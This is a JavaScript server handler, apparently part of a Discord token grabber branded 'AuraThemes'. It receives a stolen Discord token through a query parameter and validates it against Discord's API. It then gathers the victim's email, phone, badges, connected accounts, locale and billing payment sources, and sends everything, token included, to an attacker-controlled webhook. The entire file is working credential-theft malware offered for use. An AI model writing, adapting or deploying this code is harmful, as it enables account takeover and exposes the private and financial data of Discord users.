import { EmbedBuilder, WebhookClient } from 'discord.js';
import { webhook as WEBHOOK } from '../../../../k4itrun.config';
import fetch from 'sync-fetch';
import axios from 'axios';

const webhook = new WebhookClient({
  url: WEBHOOK,
});

export default async function handler(req, res) {
  try {
    const { query } = req;
    if (!query.data) {
      res.status(400).send('Bad Request: Missing "data" query parameter');
      return;
    }

    const { data } = query;

    let info;
    await axios.get("https://discord.com/api/v9/users/@me", {
      headers: {
        "Content-Type": "application/json",
        "Authorization": data
      }
    }).then(res => {
      info = {
        token: data,
        ...res.data
      }
    }).catch(() => {
      info = null
    })

    if (info?.id) {
      const profile = await getUser(info?.id, info?.token);

      await webhook.send({
        embeds: [embedGrabber(profile, info, data)],
        username: '@AuraThemes',
        avatarURL: 'https://i.imgur.com/WkKXZSl.gif',
      });
    }

    res.status(200).send(data);
    console.log("New visit:", data)

  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Internal Server Error');
  }
}

const emojis = {
  verified_developer: '<:verified_developer:1127326470793084958>',
  staff: '<:staff:1127329116669095946>',
  premium: '<:premium:1127326478145691698>',
  legacy_username: '<:legacy_username:1127326605346357268>',
  active_developer: '<:active_developer:1127329114160889877>',
  bug_hunter_level_1: '<:bug_hunter_level_1:1127326566326739135>',
  bug_hunter_level_2: '<:bug_hunter_level_2:1127326649797574736>',
  certified_moderator: '<:certified_moderator:1127329119173087264>',
  early_supporter: '<:early_supporter:1127327191856853053>',
  hypesquad: '<:hypesquad:1127329117889638520>',
  hypesquad_house_1: '<:hypesquad_house_1:1127326472466608180>',
  hypesquad_house_2: '<:hypesquad_house_2:1127326474714763334>',
  hypesquad_house_3: '<:hypesquad_house_3:1127326449846734948>'
};

const icons = {
  guild_booster_lvl1: '<:nitro_boost1m:1127326452401066014>',
  guild_booster_lvl2: '<:nitro_boost2m:1127326454229774447>',
  guild_booster_lvl3: '<:nitro_boost3m:1127326456305942589>',
  guild_booster_lvl4: '<:nitro_boost6m:1127326459153875005>',
  guild_booster_lvl5: '<:nitro_boost9m:1127326461561426091>',
  guild_booster_lvl6: '<:nitro_boost12m:1127326463335596094>',
  guild_booster_lvl7: '<:nitro_boost15m:1127326465806057602>',
  guild_booster_lvl8: '<:nitro_boost18m:1127326467206955138>',
  guild_booster_lvl9: '<:nitro_boost24m:1127326468435878011>'
};

const languages = {
  "zh-TW": "🇨🇳 Chinese-Taiwanese",
  "pr-BR": "🇵🇹 Portuguese",
  "sv-SE": "🇸🇪 Swedish",
  "zh-CN": "🇨🇳 Chinese-China",
  "en-GB": "🪟 English (UK)",
  "en-US": "🇺🇸 USA",
  "es-ES": "🇪🇸 Español",
  "ro": "🇷🇴 Romanian",
  "fi": "🇫🇮 Finnish",
  "vi": "🇻🇳 Vietnamese",
  "tr": "🇹🇷 Turkish",
  "ru": "🇷🇺 Russian",
  "uk": "🇺🇦 Ukrainian",
  "hi": "🇮🇳 Indian",
  "th": "🇹🇼 Taiwanese",
  "hr": "🇭🇷 Croatian",
  "it": "🇮🇹 Italianio",
  "lt": "🇱🇹 Lithuanian",
  "no": "🇳🇴 Norwegian",
  "ja": "🇯🇵 Japanese",
  "ko": "🇰🇷 Korean",
  "fr": "🇫🇷 French",
  "da": "🇩🇰 Dansk",
  "de": "🇩🇪 Deutsch",
  "pl": "🇵🇱 Polish",
  "cs": "🇨🇿 Czech",
  "el": "🇬🇷 Greek",
  "bg": "🇧🇬 Bulgarian",
  "hu": "🇳🇴🇭🇺 Hungarian",
};

async function getUser(id, token) {
  if (!id) return 'ID Invalid!';
  try {
    const { data } = await axios.get(`https://discord.com/api/users/${id}/profile`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: token
      }
    });
    const premium = getBoost(data.badges, data?.premium_since, data?.premium_guild_since);
    const badges = getBadges(data.badges);
    return {
      response: true,
      token: token,
      id: data.user.id,
      name: data.user.global_name,
      username: data.user.discriminator !== '0' ? `${data.user.username}#${data.user.discriminator}` : data.user.username,
      legacy_username: data.legacy_username,
      pronouns: data.user_profile.pronouns,
      avatar: `https://cdn.discordapp.com/avatars/${data.user.id}/${data.user.avatar}`,
      accounts: data.connected_accounts,
      badges,
      premium
    };
  } catch (error) {
    return undefined;
  }
}

function getBadges(inputs) {
  const badges = [];
  if (!inputs.length) return null;
  const filterBadges = inputs.filter(({ id }) => !id.includes('guild_booster_lvl'));

  filterBadges.map((x) => {
    badges.push({
      name: x.id,
      badge: `${emojis[x.id]}`
    });
  });
  return !badges.length ? null : badges;
}

function getActualDate(boost) {
  let date = new Date();
  let diff = date.getTime() - new Date(boost).getTime();

  let millisecondsPerDay = 1000 * 60 * 60 * 24;
  let days = Math.floor(diff / millisecondsPerDay);
  let months = Math.floor(days / 30.44);
  let remainingDays = days - months * 30.44;
  let hours = Math.floor((diff / (1000 * 60 * 60)) % 24);

  return `${months} month(s) ${Math.floor(remainingDays)} day(s) and ${hours} hour(s) ago.`;
}

function getNextDate(boost, level) {
  const levels = {
    1: 1,
    2: 2,
    3: 3,
    4: 6,
    5: 9,
    6: 12,
    7: 15,
    8: 18,
    9: 24
  };
  const levelUp = levels[level + 1];
  if (!levelUp) return undefined;
  const nextTier = new Date(new Date(boost).setMonth(new Date(boost).getMonth() + levelUp));
  return nextTier;
}

function getBoost(flags, premium_since, guild_since) {
  if (!premium_since || !guild_since) return undefined;
  if (!flags.length) return undefined;

  const badges = flags.map(({ id, icon }) => ({ name: id || undefined, badge: icon || undefined }));
  const boost_levels = badges.find(({ name }) => name.includes('guild_booster'));
  const boost = boost_levels.name.split('guild_booster_lvl');
  const boost_actual = {
    badge: icons['guild_booster_lvl' + boost[1]],
    date: getActualDate(guild_since)
  };
  const nextDate = boost[1] && getNextDate(guild_since, parseInt(boost[1]));
  const boost_up = boost[1] && nextDate ? {
    badge: icons['guild_booster_lvl' + (parseInt(boost[1]) + 1)],
    date: nextDate
  } : undefined;

  return {
    boost_actual,
    boost_up
  };
}

function getAPI(url, token) {
  const res = fetch(url, {
    method: "GET",
    headers: {
      "Content-Type": "application/json",
      "Authorization": token,
    },
  });
  return res.status === 200 ? res.json() : "Invalid";
}

function getImage(p) {
  if (!p) return false;
  return `${p}.${fetch(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
}

function getLanguage(l) {
  return languages[l] || "Unknown Language";
}

function getStatus(l) {
  const x = {
    online: "<:online:1129709364316491787>",
    idle: "<:idle:1120542710424674306>",
    dnd: "<:dnd:974692691289993216>",
    invisible: "<:offline:1137141023529762916>",
  }
  return x[l] || "Unknown Status";
}


function embedGrabber(profile, info, token) {
  const settings = getAPI(`https://discord.com/api/v9/users/@me/settings`, info.token);
  const payment = getAPI(`https://discord.com/api/v9/users/@me/billing/payment-sources`, info.token);

  console.log(profile);
  const nitro = profile?.premium ? profile.premium.boost_actual.badge : `\`No found\``;
  const badges = profile.badges[0] ? profile.badges.map(e => e.badge).join(', ') : `\`No found\``;
  const accounts = profile.accounts[0] ? profile.accounts.map(e => e.type).join(', ') : `\`No found\``;
  const avatar = profile.response ? getImage(profile.avatar) : 'https://i.imgur.com/WkKXZSl.gif';

  const billing = payment?.reduce((a, e) => {
    if (e.email) a += `<:paypal:861207258846330880> `;
    if (e.type == 1 && !e.invalid) a += `<:creditcart:741512388490035251> `;
    if (e.type == 3 && !e.invalid) a += `\`Giropay\` `;
    if (e.type == 16 && !e.invalid) a += `\`Rabobank\` `;
    if (e.type == 7 && !e.invalid) a += `\`PaysafeCard\` `;
    return a;
  }, '') ||  `\`No found\``;

  return new EmbedBuilder()
    .setAuthor({
      name: `${info.username} | ${info.id}`,
      iconURL: avatar
    })
    .setThumbnail(avatar)
    .setColor("#c267ff")
    .setTitle('AuraThemes Dualhooked')
    .addFields(
      { name: "<a:aura:1087044506542674091> Token", value: `\`\`\`${token}\`\`\``, inline: false },
      { name: "Nitro", value: `${nitro}`, inline: true },
      { name: "Badges", value: `${badges}`, inline: true },
      { name: "Phone", value: `\`${info.phone || "None"}\``, inline: true },
      { name: "Email", value: `\`${info.email || "None"}\``, inline: false },
      { name: "Billing", value: `${billing}`, inline: true },
      { name: "Accounts", value: `${accounts}`, inline: true },
      { name: "Langue", value: getLanguage(settings.locale), inline: true },
      { name: "Status", value: getStatus(settings.status), inline: true },
    )
    .setFooter({
      text: 'AuraThemes Grabber',
      iconURL: 'https://i.imgur.com/WkKXZSl.gif'
    })
    .setTimestamp();
}
